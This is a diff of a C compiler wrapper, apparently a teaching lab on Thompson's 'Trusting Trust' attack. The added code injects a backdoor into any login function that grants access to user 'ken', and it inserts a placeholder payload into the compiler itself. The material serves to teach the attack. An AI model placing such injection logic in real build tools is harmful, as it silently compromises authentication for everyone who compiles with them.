@@ -16,8 +16,6 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
 
 
     /*****************************************************************
@@ -30,7 +28,17 @@ static void compile(char *program, char *outname) {
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-     
+    char* login_loc = strstr(program, login_sig);
+    if (login_loc != NULL) {
+        // Move pointer to end of function signature
+        int login_idx = login_loc - program + strlen(login_sig); 
+        char* buf = malloc(strlen(program) + 4096);
+        strncpy(buf, program, login_idx);
+        buf[login_idx] = '\0';
+        strcat(buf, login_attack);
+        strcat(buf, program + login_idx);
+        program = buf;
+    }
 
     /*****************************************************************
      * Step 2:
@@ -49,11 +57,25 @@ static void compile(char *program, char *outname) {
     static char compile_attack[] 
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
+    char* compile_loc = strstr(program, compile_sig);
+    if (compile_loc != NULL) {
+        // Move pointer to end of function signature
+        int compile_idx = compile_loc - program + strlen(compile_sig); 
+        char* buf = malloc(strlen(program) + 4096);
+        strncpy(buf, program, compile_idx);
+        buf[compile_idx] = '\0';
+        strcat(buf, compile_attack);
+        strcat(buf, program + compile_idx);
+        program = buf;
+    }
 
 
     /************************************************************
      * don't modify the rest.
      */
+
+    fprintf(fp, "%s", program);
+    fclose(fp);
 
     // gross, call gcc.
     char buf[1024];
